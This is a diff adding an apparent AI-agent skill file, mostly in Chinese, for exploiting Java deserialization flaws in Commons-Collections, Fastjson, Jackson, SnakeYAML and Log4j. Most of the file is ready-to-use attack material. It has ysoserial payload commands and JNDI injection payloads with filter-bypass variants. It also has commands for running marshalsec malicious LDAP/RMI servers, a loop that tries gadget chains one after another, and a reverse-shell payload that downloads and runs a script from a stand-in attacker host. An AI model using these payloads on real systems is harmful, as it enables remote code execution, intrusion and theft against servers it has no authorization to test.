@@ -1,0 +1,169 @@
+---
+name: java-deserialization
+description: Use when encountering java反序列化漏洞利用 - commons-collections、spring、fastjson、log4j等组件的rce攻击链
+---
+
+# Java反序列化攻击
+
+## Info
+
+- **Domain**: web
+- **Tags**: web, deserialization, java, rce, gadgets
+
+## 核心概念
+Java反序列化漏洞发生在应用将不可信数据反序列化时，攻击者可构造恶意对象实现RCE。
+
+## 常见漏洞组件
+
+### 1. Apache Commons-Collections
+
+**探测与利用：**
+```bash
+# 使用ysoserial生成payload
+java -jar ysoserial.jar CommonsCollections1 "id" | base64
+
+# CommonsCollections链
+- CC1: CommonsCollections <= 3.2.1
+- CC2: CommonsCollections4 4.0
+- CC3: 利用TemplatesImpl
+- CC4: CommonsCollections4 4.0
+- CC5: BadAttributeValueExpException
+- CC6: HashSet + TiedMapEntry
+- CC7: Hashtable
+```
+
+**URLDNS探测：**
+```bash
+# 使用URLDNS检测反序列化点
+java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" | base64
+```
+
+### 2. Fastjson
+
+**JNDI注入：**
+```json
+// Fastjson <= 1.2.24
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
+
+// Fastjson 1.2.25-1.2.47 绕过
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}}
+```
+
+**TemplatesImpl利用：**
+```json
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64_encoded_bytecode"],"_name":"a","_tfactory":{},"_outputProperties":{}}
+```
+
+### 3. Jackson
+
+**Polymorphic Deserialization：**
+```json
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}]
+```
+
+**CVE-2017-7525：**
+```json
+{"id":1,"obj":["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://attacker:1099/Exploit","autoCommit":true}]}
+```
+
+### 4. SnakeYAML
+
+**ScriptEngine利用：**
+```yaml
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]
+```
+
+**JNDI注入：**
+```yaml
+!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "ldap://attacker:1389/Exploit", autoCommit: true}
+```
+
+### 5. Log4j (CVE-2021-44228)
+
+**JNDI注入：**
+```
+${jndi:ldap://attacker:1389/a}
+${jndi:rmi://attacker:1099/a}
+${jndi:dns://attacker/a}
+
+# 绕过
+${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://attacker/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}
+${jn${env::-}di:ldap://attacker/a}
+```
+
+**信息泄露：**
+```
+${env:FLAG}
+${java:os}
+${sys:user.home}
+```
+
+## 工具
+
+### ysoserial
+```bash
+# 生成payload
+java -jar ysoserial.jar CommonsCollections6 "curl http://attacker/shell.sh|bash" | base64 -w 0
+
+# JRMP服务端
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "id"
+```
+
+### marshalsec (JNDI服务器)
+```bash
+# 启动LDAP服务器
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8080/#Exploit" 1389
+
+# 启动RMI服务器
+java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker:8080/#Exploit" 1099
+```
+
+### JNDIExploit
+```bash
+java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker_ip
+```
+
+### fastjson-exploit
+```bash
+python3 fastjson_exp.py -u http://target -t fastjson
+```
+
+## 攻击链
+
+### 1. 检测反序列化点
+```bash
+# 发送URLDNS payload
+java -jar ysoserial.jar URLDNS "http://dnslog.cn" | base64
+
+# 监听DNS回调确认
+```
+
+### 2. 确定Gadget
+```bash
+# 尝试不同CC链
+for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6; do
+  java -jar ysoserial.jar $chain "id" > payload.bin
+  # 发送payload
+done
+```
+
+### 3. 获取Shell
+```bash
+# 反弹shell
+java -jar ysoserial.jar CommonsCollections6 "bash -c {curl,http://attacker/shell.sh}|{bash,-i}" | base64
+
+# 或使用JNDI
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8080/#Shell" 1389
+```
+
+## 常见CVE
+
+| CVE | 组件 | 描述 |
+|-----|------|------|
+| CVE-2015-4852 | WebLogic | Commons-Collections反序列化 |
+| CVE-2017-12149 | JBoss | 反序列化RCE |
+| CVE-2019-0193 | Apache Solr | JMX RCE |
+| CVE-2020-0688 | Exchange | ValidationService反序列化 |
+| CVE-2021-26084 | Confluence | OGNL注入 |
+| CVE-2021-44228 | Log4j | JNDI注入 |
